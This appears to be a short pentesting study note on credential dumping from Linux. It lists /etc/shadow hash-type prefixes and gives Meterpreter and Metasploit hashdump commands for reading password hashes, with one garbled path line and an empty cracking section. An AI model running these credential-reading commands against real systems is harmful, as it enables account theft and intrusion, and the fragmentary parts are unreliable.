node.name: Credential Dumping
node.rich_text:
Types of Hashing algorithm:
| Value | Hashing Algorithm | | ----- | ----------------- | | $1 | MD5 | | $2 | Blowfish | | $5 | SHA-256 | | $6 | SHA-512 | **whit meterpreter session**: cat /etc/shadow root: **$password-hash$**
- Cracking hash: - -hash dump module (msf):
node.codebox: search hashdump #gather/hashdump set SESSION 2 run #root: **$password-hash$** #Unshadowed Password File /root/route/etc/etc/etc...
